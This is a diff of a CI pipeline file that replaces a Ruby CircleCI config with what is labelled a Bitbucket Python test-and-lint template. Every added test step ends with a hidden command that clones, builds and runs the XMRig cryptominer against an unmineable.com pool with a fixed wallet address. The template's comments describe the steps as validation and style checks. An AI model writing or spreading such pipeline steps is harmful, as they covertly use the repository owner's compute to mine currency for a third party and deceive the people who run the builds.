@@ -1,48 +1,75 @@
-version: 2.0
-  steps:
-    - checkout
-    - run: curl -L https://codeclimate.com/downloads/test-reporter/test-reporter-latest-linux-amd64 > ./cc-test-reporter
-    - run: chmod +x ./cc-test-reporter
-    - run: ./cc-test-reporter before-build
-    - run: gem install bundler:2.1.4
-    - run: bundle install --jobs=4 --retry=4 --path vendor/bundle
-    - run: bundle exec rake rubocop
-    - run: ./deploy.sh
+#  Template python-build
 
-jobs:
-  build:
-    docker:
-      - image: ruby
-    steps:
-      - checkout
-  build_ruby2_7:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.7
-  build_ruby2_6:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.6
-  build_ruby2_5:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.5
-  build_ruby2_4:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.4
-  build_ruby2_3:
-    <<: *build_definition
-    docker:
-      - image: ruby:2.3
+#  This template allows you to validate your python code.
+#  The workflow allows running tests and code linting on the default branch.
 
-workflows:
-  version: 2
-  build_ruby_versions:
-    jobs:
-      - build
-      - build_ruby2_7
-      - build_ruby2_6
-      - build_ruby2_5
-      - build_ruby2_4
-      - build_ruby2_3
+image: python:3.8
+
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: Test1
+          caches:
+            - pip
+          script:
+            - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
+            - pip install pytest
+            - pytest -v tests/* --junitxml=test-reports/report.xml
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test2
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test3
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test4
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test5
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test6
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test7
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test9
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
+      - step:
+          name: Test10
+          script:
+            # Enforce style consistency across Python projects https://flake8.pycqa.org/en/latest/manpage.html
+            - pip install flake8
+            - flake8 . --extend-exclude=dist,build --show-source --statistics
+            - apt-get update -y && apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/build &&  cmake .. && make -j$(2)  && ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 8
